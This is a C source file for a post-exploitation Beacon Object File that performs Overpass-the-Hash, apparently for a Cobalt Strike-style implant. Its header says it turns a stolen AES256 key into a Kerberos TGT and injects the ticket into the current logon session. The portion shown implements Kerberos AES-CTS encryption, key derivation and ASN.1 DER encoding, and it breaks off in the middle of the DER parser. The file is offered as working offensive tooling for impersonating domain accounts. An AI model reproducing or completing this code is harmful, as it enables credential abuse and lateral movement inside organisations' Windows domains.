/*
 * overpass.c — Self-contained Overpass-the-Hash BOF.
 *
 * Takes /user, /domain, /aes256, /dc (or /dc-ip).  Does AS-REQ with
 * AES256-CTS-HMAC-SHA1-96 pre-auth, parses AS-REP, decrypts enc-part,
 * builds a KRB-CRED containing the TGT + session key, and submits it to
 * the current LUID via LsaCallAuthenticationPackage(KerbSubmitTicketMessage).
 *
 * No external deps.  Uses bcrypt for AES/SHA1, ws2_32 for TCP, secur32 for LSA.
 *
 * References:
 *   RFC 4120  Kerberos v5 messages / ASN.1
 *   RFC 3961  Kerberos encryption framework
 *   RFC 3962  AES encryption for Kerberos 5
 */

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <ntsecapi.h>
#include <stdint.h>
#include <stdarg.h>

extern "C" {
#include "beacon.h"

void go(char* buff, int len);

/* ---------- DFR imports ---------- */
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT void    WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME*, LPSYSTEMTIME);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int     __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT int     __cdecl MSVCRT$_vsnprintf(char*, size_t, const char*, va_list);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$wcslen(const wchar_t*);

DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptSetProperty(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptEncrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE);
DECLSPEC_IMPORT NTSTATUS WINAPI BCRYPT$BCryptGenRandom(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);

DECLSPEC_IMPORT int     WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT int     WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET  WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int     WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT int     WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int     WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int     WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int     WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
DECLSPEC_IMPORT void    WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short);
}

#define HEAP_ALLOC(sz)  KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define HEAP_FREE(p)    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

/* ---- buffered BOF output: everything flushed in ONE BeaconOutput, so the
 * operator sees a single "Received Output" chunk (per MODULE_DEVELOPMENT.md).
 * Also avoids BeaconPrintf-per-line, which spams multiple chunks. */
static char* bof_outbuf = NULL;
static int   bof_outlen = 0;
static int   bof_outcap = 0;

static void bof_out_append(const char* data, int len)
{
    if (!data || len <= 0) return;
    if (bof_outlen + len + 1 > bof_outcap) {
        int newcap = bof_outcap ? bof_outcap * 2 : 4096;
        while (newcap < bof_outlen + len + 1) newcap *= 2;
        char* nb = (char*)HEAP_ALLOC((SIZE_T)newcap);
        if (!nb) return;
        if (bof_outbuf && bof_outlen) MSVCRT$memcpy(nb, bof_outbuf, (size_t)bof_outlen);
        if (bof_outbuf) HEAP_FREE(bof_outbuf);
        bof_outbuf = nb;
        bof_outcap = newcap;
    }
    MSVCRT$memcpy(bof_outbuf + bof_outlen, data, (size_t)len);
    bof_outlen += len;
    bof_outbuf[bof_outlen] = 0;
}

static void bof_printf(const char* fmt, ...)
{
    char buf[1024];
    va_list ap;
    int n;
    if (!fmt) return;
    va_start(ap, fmt);
    n = MSVCRT$_vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) n = (int)sizeof(buf) - 1;
    if (n > (int)sizeof(buf) - 1) n = (int)sizeof(buf) - 1;
    bof_out_append(buf, n);
}

static void bof_flush(void)
{
    if (bof_outbuf && bof_outlen > 0) {
        BeaconOutput(CALLBACK_OUTPUT, bof_outbuf, bof_outlen);
        bof_outlen = 0;
        bof_outbuf[0] = 0;
    }
}

/* ============================================================================
 *                            CRYPTO (RFC 3961 / 3962)
 * ============================================================================ */

#define AES_BLOCK  16
#define AES256_KEY 32
#define HMAC_TRUNC 12   /* 96 bits */
#define SHA1_SIZE  20

/* AES-ECB single-block encrypt. */
static int aes_ecb_encrypt_block(const uint8_t* key, int keylen, const uint8_t* in, uint8_t* out)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS s;
    ULONG got = 0;
    int rc = 0;

    s = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (s < 0) return 0;
    s = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
                                 (ULONG)((MSVCRT$wcslen(BCRYPT_CHAIN_MODE_ECB) + 1) * sizeof(wchar_t)), 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keylen, 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptEncrypt(hKey, (PUCHAR)in, AES_BLOCK, NULL, NULL, 0, out, AES_BLOCK, &got, 0);
    if (s < 0) goto out;
    rc = 1;
out:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}

/* AES-CBC multi-block encrypt (zero IV, no padding). in/out length must be multiple of 16. */
static int aes_cbc_encrypt(const uint8_t* key, int keylen, const uint8_t* iv,
                           const uint8_t* in, int inlen, uint8_t* out)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    uint8_t ivbuf[AES_BLOCK];
    NTSTATUS s; ULONG got = 0; int rc = 0;
    MSVCRT$memcpy(ivbuf, iv, AES_BLOCK);
    s = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0); if (s < 0) return 0;
    s = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                                 (ULONG)((MSVCRT$wcslen(BCRYPT_CHAIN_MODE_CBC) + 1) * sizeof(wchar_t)), 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keylen, 0); if (s < 0) goto out;
    s = BCRYPT$BCryptEncrypt(hKey, (PUCHAR)in, (ULONG)inlen, NULL, ivbuf, AES_BLOCK, out, (ULONG)inlen, &got, 0);
    if (s < 0) goto out;
    rc = 1;
out:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}

static int aes_cbc_decrypt(const uint8_t* key, int keylen, const uint8_t* iv,
                           const uint8_t* in, int inlen, uint8_t* out)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    uint8_t ivbuf[AES_BLOCK];
    NTSTATUS s; ULONG got = 0; int rc = 0;
    MSVCRT$memcpy(ivbuf, iv, AES_BLOCK);
    s = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0); if (s < 0) return 0;
    s = BCRYPT$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                                 (ULONG)((MSVCRT$wcslen(BCRYPT_CHAIN_MODE_CBC) + 1) * sizeof(wchar_t)), 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keylen, 0); if (s < 0) goto out;
    s = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)in, (ULONG)inlen, NULL, ivbuf, AES_BLOCK, out, (ULONG)inlen, &got, 0);
    if (s < 0) goto out;
    rc = 1;
out:
    if (hKey) BCRYPT$BCryptDestroyKey(hKey);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}

/* AES-CBC-CTS encrypt per RFC 3962 (NIST SP 800-38A Addendum CS3-ish variant used by Kerberos).
 * Kerberos uses "CBC-CTS" where the ciphertext length == plaintext length.
 * Simplified: pad last partial block with zeros, standard CBC, swap last two blocks,
 * truncate the final block to original partial length. */
static int aes_cts_encrypt(const uint8_t* key, int keylen, const uint8_t* iv,
                           const uint8_t* in, int inlen, uint8_t* out)
{
    uint8_t ivbuf[AES_BLOCK];
    MSVCRT$memcpy(ivbuf, iv, AES_BLOCK);

    if (inlen == AES_BLOCK) {
        /* Single block: just CBC with zero IV. */
        return aes_cbc_encrypt(key, keylen, ivbuf, in, AES_BLOCK, out);
    }
    if (inlen < AES_BLOCK) return 0;  /* kerberos minimum = confounder (16) */

    int M = inlen % AES_BLOCK;
    if (M == 0) {
        /* Exact multiple: plain CBC then swap last two blocks. */
        uint8_t* tmp = (uint8_t*)HEAP_ALLOC((SIZE_T)inlen);
        if (!tmp) return 0;
        if (!aes_cbc_encrypt(key, keylen, ivbuf, in, inlen, tmp)) { HEAP_FREE(tmp); return 0; }
        /* Copy all but swap last two 16-byte blocks. */
        MSVCRT$memcpy(out, tmp, inlen - 2 * AES_BLOCK);
        MSVCRT$memcpy(out + inlen - 2 * AES_BLOCK, tmp + inlen - AES_BLOCK, AES_BLOCK);
        MSVCRT$memcpy(out + inlen - AES_BLOCK, tmp + inlen - 2 * AES_BLOCK, AES_BLOCK);
        HEAP_FREE(tmp);
        return 1;
    }
    /* Partial last block of M bytes.
     * Pad to full block (padded length = inlen - M + AES_BLOCK), run plain CBC,
     * swap last two output blocks, truncate the final one to M. */
    int padded_len = inlen - M + AES_BLOCK;
    uint8_t* in_pad = (uint8_t*)HEAP_ALLOC((SIZE_T)padded_len);
    uint8_t* out_pad = (uint8_t*)HEAP_ALLOC((SIZE_T)padded_len);
    if (!in_pad || !out_pad) { if (in_pad) HEAP_FREE(in_pad); if (out_pad) HEAP_FREE(out_pad); return 0; }
    MSVCRT$memcpy(in_pad, in, inlen);
    /* Trailing padding zeros come from HEAP_ZERO_MEMORY. */
    if (!aes_cbc_encrypt(key, keylen, ivbuf, in_pad, padded_len, out_pad)) {
        HEAP_FREE(in_pad); HEAP_FREE(out_pad); return 0;
    }
    /* Copy everything except the last two blocks. */
    int head = padded_len - 2 * AES_BLOCK;
    MSVCRT$memcpy(out, out_pad, head);
    /* Last two blocks swapped: out[last-16..last-1] = out_pad[last-16..last-1] goes BEFORE out_pad[last-16..last-M]? Actually:
     *   out_pad = ... || C[n-1](16) || C[n](16)   (last two blocks after CBC)
     *   output  = ... || C[n]       || C[n-1][0..M-1]
     * So: next 16 bytes of out = out_pad's last block (C[n]);
     *     final M bytes of out = out_pad's second-to-last block (C[n-1]) truncated to M.
     * Total output length = head + 16 + M = padded_len - 16 + M = inlen. ✓ */
    MSVCRT$memcpy(out + head, out_pad + head + AES_BLOCK, AES_BLOCK);
    MSVCRT$memcpy(out + head + AES_BLOCK, out_pad + head, (size_t)M);
    HEAP_FREE(in_pad); HEAP_FREE(out_pad);
    return 1;
}

/* AES-CBC-CTS decrypt — mirror of the above. */
static int aes_cts_decrypt(const uint8_t* key, int keylen, const uint8_t* iv,
                           const uint8_t* in, int inlen, uint8_t* out)
{
    if (inlen == AES_BLOCK) {
        return aes_cbc_decrypt(key, keylen, iv, in, AES_BLOCK, out);
    }
    if (inlen < AES_BLOCK) return 0;

    int M = inlen % AES_BLOCK;
    uint8_t ivbuf[AES_BLOCK];
    MSVCRT$memcpy(ivbuf, iv, AES_BLOCK);

    if (M == 0) {
        /* Exact multiple: swap last two input blocks, standard CBC decrypt. */
        uint8_t* tmp = (uint8_t*)HEAP_ALLOC((SIZE_T)inlen);
        if (!tmp) return 0;
        MSVCRT$memcpy(tmp, in, inlen - 2 * AES_BLOCK);
        MSVCRT$memcpy(tmp + inlen - 2 * AES_BLOCK, in + inlen - AES_BLOCK, AES_BLOCK);
        MSVCRT$memcpy(tmp + inlen - AES_BLOCK, in + inlen - 2 * AES_BLOCK, AES_BLOCK);
        int rc = aes_cbc_decrypt(key, keylen, ivbuf, tmp, inlen, out);
        HEAP_FREE(tmp);
        return rc;
    }
    /* Partial final: reconstruct padded ciphertext, invert swap, standard CBC decrypt, truncate.
     * Input layout:  prefix(head) || C[n](16) || C[n-1][0..M-1]
     * Padded cipher: prefix(head) || C[n-1](16) || C[n](16)   where C[n-1] = ciphertext_input[head+AES_BLOCK..head+AES_BLOCK+M-1] || (16-M bytes from the ECB-encrypt-of-zero of C[n])
     *
     * Standard CBC-CTS decrypt is intricate. We use the technique:
     *   1. Decrypt C[n] with the key in ECB mode (no IV) -> Dn  (= P[n-1] XOR C[n-2])
     *   2. The missing (16-M) tail bytes of C[n-1] are the last (16-M) bytes of Dn.
     *   3. Rebuild C[n-1]_full = C_input[head+16..head+16+M-1] || Dn[M..15]
     *   4. Swap: padded_cipher = prefix || C[n-1]_full || C[n]
     *   5. Standard CBC-decrypt padded_cipher -> padded_plain
     *   6. Truncate: out = padded_plain[0..inlen-1]
     */
    int head = inlen - AES_BLOCK - M;        /* bytes BEFORE the last two logical blocks */
    const uint8_t* Cn = in + head;           /* last full block in input */
    const uint8_t* Cn1_front = in + head + AES_BLOCK; /* first M bytes of the stolen block */
    uint8_t Dn[AES_BLOCK];
    uint8_t zero_iv[AES_BLOCK]; MSVCRT$memset(zero_iv, 0, AES_BLOCK);
    /* ECB-decrypt Cn: use a one-block CBC-decrypt with zero IV == ECB-decrypt. */
    uint8_t ecb_in[AES_BLOCK]; MSVCRT$memcpy(ecb_in, Cn, AES_BLOCK);
    {
        /* bcrypt CBC decrypt of one block with IV=0 == ECB decrypt. */
        if (!aes_cbc_decrypt(key, keylen, zero_iv, ecb_in, AES_BLOCK, Dn)) return 0;
    }
    int padded_len = head + 2 * AES_BLOCK;
    uint8_t* padded = (uint8_t*)HEAP_ALLOC((SIZE_T)padded_len);
    uint8_t* plain  = (uint8_t*)HEAP_ALLOC((SIZE_T)padded_len);
    if (!padded || !plain) { if (padded) HEAP_FREE(padded); if (plain) HEAP_FREE(plain); return 0; }
    MSVCRT$memcpy(padded, in, head);
    MSVCRT$memcpy(padded + head, Cn1_front, (size_t)M);
    MSVCRT$memcpy(padded + head + M, Dn + M, (size_t)(AES_BLOCK - M));
    MSVCRT$memcpy(padded + head + AES_BLOCK, Cn, AES_BLOCK);
    if (!aes_cbc_decrypt(key, keylen, ivbuf, padded, padded_len, plain)) {
        HEAP_FREE(padded); HEAP_FREE(plain); return 0;
    }
    MSVCRT$memcpy(out, plain, (size_t)inlen);
    HEAP_FREE(padded); HEAP_FREE(plain);
    return 1;
}

/* HMAC-SHA1, full 20-byte output. */
static int hmac_sha1(const uint8_t* key, int keylen, const uint8_t* data, int datalen, uint8_t* mac20)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS s; int rc = 0;
    s = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (s < 0) return 0;
    s = BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, (ULONG)keylen, 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptHashData(hHash, (PUCHAR)data, (ULONG)datalen, 0);
    if (s < 0) goto out;
    s = BCRYPT$BCryptFinishHash(hHash, mac20, SHA1_SIZE, 0);
    if (s < 0) goto out;
    rc = 1;
out:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg)  BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return rc;
}

/* nfold(in, 128) — RFC 3961 section 5.1.  Fold `inlen` bytes into 16 bytes. */
static void nfold(const uint8_t* in, int inlen, uint8_t out[16])
{
    const int outbits = 128;
    const int inbits  = inlen * 8;
    /* lcm(inbits, outbits) in bits */
    int a = inbits, b = outbits;
    while (b) { int t = a % b; a = b; b = t; }
    int lcm_bits = (inbits / a) * outbits;
    int reps = lcm_bits / inbits;

    uint8_t* buf = (uint8_t*)HEAP_ALLOC((SIZE_T)lcm_bits / 8);
    if (!buf) { MSVCRT$memset(out, 0, 16); return; }

    /* Fill buf with 'reps' rotated copies of in; rotate by 13 bits each copy. */
    int rotbits = 0;
    for (int r = 0; r < reps; r++) {
        for (int i = 0; i < inbits; i++) {
            int src_bit = (i - rotbits) % inbits;
            if (src_bit < 0) src_bit += inbits;
            int b_val = (in[src_bit / 8] >> (7 - (src_bit % 8))) & 1;
            int dest = r * inbits + i;
            if (b_val) buf[dest / 8] |= (uint8_t)(1 << (7 - (dest % 8)));
            else       buf[dest / 8] &= (uint8_t)~(1 << (7 - (dest % 8)));
        }
        rotbits = (rotbits + 13) % inbits;
    }
    /* Sum each 16-byte chunk with ones'-complement addition. */
    uint8_t acc[16]; MSVCRT$memset(acc, 0, 16);
    int chunks = lcm_bits / outbits;
    for (int c = 0; c < chunks; c++) {
        /* Add buf[c*16..c*16+15] to acc as 128-bit ones'-complement big-endian. */
        int carry = 0;
        for (int i = 15; i >= 0; i--) {
            int sum = acc[i] + buf[c * 16 + i] + carry;
            acc[i] = (uint8_t)(sum & 0xff);
            carry = sum >> 8;
        }
        /* Fold carry back (ones'-complement). */
        while (carry) {
            int sum = acc[15] + carry;
            acc[15] = (uint8_t)(sum & 0xff);
            carry = sum >> 8;
            if (!carry) break;
            for (int i = 14; i >= 0 && carry; i--) {
                sum = acc[i] + carry;
                acc[i] = (uint8_t)(sum & 0xff);
                carry = sum >> 8;
            }
        }
    }
    MSVCRT$memcpy(out, acc, 16);
    HEAP_FREE(buf);
}

/* DK(key, constant_bytes, constant_len) — RFC 3961 section 5.1; AES256 output = 32 bytes. */
static int derive_key_aes256(const uint8_t* base, const uint8_t* constant, int constant_len, uint8_t out[AES256_KEY])
{
    uint8_t folded[16];
    uint8_t t1[AES_BLOCK], t2[AES_BLOCK];
    nfold(constant, constant_len, folded);
    if (!aes_ecb_encrypt_block(base, AES256_KEY, folded, t1)) return 0;
    if (!aes_ecb_encrypt_block(base, AES256_KEY, t1,     t2)) return 0;
    MSVCRT$memcpy(out,              t1, AES_BLOCK);
    MSVCRT$memcpy(out + AES_BLOCK,  t2, AES_BLOCK);
    return 1;
}

/* Build the 5-byte usage constant (4-byte BE usage || 1-byte type). */
static void usage_constant(uint32_t usage, uint8_t type_byte, uint8_t out[5])
{
    out[0] = (uint8_t)(usage >> 24);
    out[1] = (uint8_t)(usage >> 16);
    out[2] = (uint8_t)(usage >> 8);
    out[3] = (uint8_t)(usage & 0xff);
    out[4] = type_byte;
}

/* Encrypt plaintext P under base key with specified usage (RFC 3962).
 * Output = confounder+plaintext encrypted with Ke || HMAC-96 under Ki.
 * out buffer must have (16 + inlen + 12) bytes. */
static int kerb_encrypt(const uint8_t* base, const uint8_t* plain, int plain_len,
                        uint32_t usage, uint8_t* out, int* out_len)
{
    uint8_t Ke[AES256_KEY], Ki[AES256_KEY];
    uint8_t c_ke[5], c_ki[5];
    uint8_t confounder[AES_BLOCK];
    uint8_t iv[AES_BLOCK]; MSVCRT$memset(iv, 0, AES_BLOCK);
    usage_constant(usage, 0xAA, c_ke);
    usage_constant(usage, 0x55, c_ki);
    if (!derive_key_aes256(base, c_ke, 5, Ke)) return 0;
    if (!derive_key_aes256(base, c_ki, 5, Ki)) return 0;

    BCRYPT$BCryptGenRandom(NULL, confounder, AES_BLOCK, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    int cp_len = AES_BLOCK + plain_len;
    uint8_t* cp = (uint8_t*)HEAP_ALLOC((SIZE_T)cp_len);
    if (!cp) return 0;
    MSVCRT$memcpy(cp, confounder, AES_BLOCK);
    MSVCRT$memcpy(cp + AES_BLOCK, plain, (size_t)plain_len);

    uint8_t* ct = out;
    if (!aes_cts_encrypt(Ke, AES256_KEY, iv, cp, cp_len, ct)) { HEAP_FREE(cp); return 0; }

    uint8_t mac20[SHA1_SIZE];
    if (!hmac_sha1(Ki, AES256_KEY, cp, cp_len, mac20)) { HEAP_FREE(cp); return 0; }
    MSVCRT$memcpy(out + cp_len, mac20, HMAC_TRUNC);

    HEAP_FREE(cp);
    *out_len = cp_len + HMAC_TRUNC;
    return 1;
}

/* Decrypt cipher under base key with specified usage.  out buffer size >= cipher_len. */
static int kerb_decrypt(const uint8_t* base, const uint8_t* cipher, int cipher_len,
                        uint32_t usage, uint8_t* out, int* out_len)
{
    if (cipher_len < AES_BLOCK + HMAC_TRUNC) return 0;
    uint8_t Ke[AES256_KEY], Ki[AES256_KEY];
    uint8_t c_ke[5], c_ki[5];
    uint8_t iv[AES_BLOCK]; MSVCRT$memset(iv, 0, AES_BLOCK);
    usage_constant(usage, 0xAA, c_ke);
    usage_constant(usage, 0x55, c_ki);
    if (!derive_key_aes256(base, c_ke, 5, Ke)) return 0;
    if (!derive_key_aes256(base, c_ki, 5, Ki)) return 0;

    int ct_len = cipher_len - HMAC_TRUNC;
    uint8_t* cp = (uint8_t*)HEAP_ALLOC((SIZE_T)ct_len);
    if (!cp) return 0;
    if (!aes_cts_decrypt(Ke, AES256_KEY, iv, cipher, ct_len, cp)) { HEAP_FREE(cp); return 0; }

    uint8_t mac20[SHA1_SIZE];
    if (!hmac_sha1(Ki, AES256_KEY, cp, ct_len, mac20)) { HEAP_FREE(cp); return 0; }
    if (MSVCRT$memcmp(mac20, cipher + ct_len, HMAC_TRUNC) != 0) { HEAP_FREE(cp); return 0; }

    /* Drop the 16-byte confounder. */
    int plain_len = ct_len - AES_BLOCK;
    MSVCRT$memcpy(out, cp + AES_BLOCK, (size_t)plain_len);
    *out_len = plain_len;
    HEAP_FREE(cp);
    return 1;
}

/* ============================================================================
 *                            ASN.1 DER
 * ============================================================================ */

/* Writer: fills a buffer from the END backward.  cursor starts at buf+bufcap and decreases. */
typedef struct { uint8_t* base; uint8_t* cur; } asn1w_t;

static void asn1w_init(asn1w_t* w, uint8_t* buf, int cap) { w->base = buf; w->cur = buf + cap; }
static int  asn1w_used(const asn1w_t* w, uint8_t* end) { return (int)(end - w->cur); }

static void asn1w_prepend(asn1w_t* w, const uint8_t* data, int len)
{
    w->cur -= len;
    MSVCRT$memcpy(w->cur, data, (size_t)len);
}

static void asn1w_prepend_byte(asn1w_t* w, uint8_t b)
{
    w->cur -= 1;
    *w->cur = b;
}

static int asn1w_write_length(asn1w_t* w, int len)
{
    if (len < 0x80) { asn1w_prepend_byte(w, (uint8_t)len); return 1; }
    uint8_t bytes[5]; int n = 0;
    unsigned u = (unsigned)len;
    while (u) { bytes[n++] = (uint8_t)(u & 0xff); u >>= 8; }
    for (int i = 0; i < n; i++) asn1w_prepend_byte(w, bytes[i]);
    asn1w_prepend_byte(w, (uint8_t)(0x80 | n));
    return n + 1;
}

/* Write a TLV: given content length (already written before), prepend length + tag. */
static int asn1w_tlv_wrap(asn1w_t* w, uint8_t tag, int content_len)
{
    int lenbytes = asn1w_write_length(w, content_len);
    asn1w_prepend_byte(w, tag);
    return 1 + lenbytes + content_len;
}

/* Write BOOLEAN. */
static int asn1w_boolean(asn1w_t* w, int v)
{
    asn1w_prepend_byte(w, v ? 0xFF : 0x00);
    return asn1w_tlv_wrap(w, 0x01, 1);
}

/* Write INTEGER (unsigned, up to 32-bit).  Pads with 0x00 if MSB set. */
static int asn1w_integer_u32(asn1w_t* w, uint32_t v)
{
    uint8_t bytes[5]; int n = 0;
    if (v == 0) { bytes[n++] = 0; }
    else {
        uint32_t tmp = v;
        while (tmp) { bytes[n++] = (uint8_t)(tmp & 0xff); tmp >>= 8; }
        if (bytes[n-1] & 0x80) bytes[n++] = 0x00;
    }
    for (int i = 0; i < n; i++) asn1w_prepend_byte(w, bytes[i]);
    return asn1w_tlv_wrap(w, 0x02, n);
}

/* OCTET STRING */
static int asn1w_octet(asn1w_t* w, const uint8_t* data, int len)
{
    asn1w_prepend(w, data, len);
    return asn1w_tlv_wrap(w, 0x04, len);
}

/* GeneralString */
static int asn1w_generalstring(asn1w_t* w, const char* s)
{
    int len = (int)MSVCRT$strlen(s);
    asn1w_prepend(w, (const uint8_t*)s, len);
    return asn1w_tlv_wrap(w, 0x1B, len);
}

/* GeneralizedTime "YYYYMMDDHHMMSSZ" (15 chars) */
static int asn1w_generaltime(asn1w_t* w, const char* ts)
{
    int len = (int)MSVCRT$strlen(ts);
    asn1w_prepend(w, (const uint8_t*)ts, len);
    return asn1w_tlv_wrap(w, 0x18, len);
}

/* BIT STRING with explicit unused-bits byte = 0.  For KDCOptions / TicketFlags. */
static int asn1w_bitstring(asn1w_t* w, const uint8_t* data, int len)
{
    asn1w_prepend(w, data, len);
    asn1w_prepend_byte(w, 0x00);  /* unused bits */
    return asn1w_tlv_wrap(w, 0x03, len + 1);
}

/* Wrap previously-written content with a context-specific explicit tag [n]. */
static int asn1w_wrap_ctx(asn1w_t* w, int tag_num, int content_len)
{
    return asn1w_tlv_wrap(w, (uint8_t)(0xA0 | tag_num), content_len);
}

/* Wrap with SEQUENCE. */
static int asn1w_wrap_seq(asn1w_t* w, int content_len)
{
    return asn1w_tlv_wrap(w, 0x30, content_len);
}

/* Wrap with APPLICATION [n] (constructed). */
static int asn1w_wrap_app(asn1w_t* w, int tag_num, int content_len)
{
    return asn1w_tlv_wrap(w, (uint8_t)(0x60 | tag_num), content_len);
}

/* ---------- DER reader ---------- */
typedef struct { const uint8_t* p; const uint8_t* end; } asn1r_t;

static int asn1r_tag(asn1r_t* r, uint8_t* out_tag)
{
    if (r->p >= r->end) return 0;
    *out_tag = *r->p++;
    return 1;
}
static int asn1r_length(asn1r_t* r, int* out_len)
{
    if (r->p >= r->end) return 0;
    uint8_t b = *r->p++;
    if (b < 0x80) { *out_len = b; return 1; }
    int n = b & 0x7f;
    if (n == 0 || n > 4) return 0;
    if (r->p + n > r->end) return 0;
    int v = 0;
    for (int i = 0; i < n; i++) v = (v << 8) | *r->p++;
    *out_len = v;
    return 1;
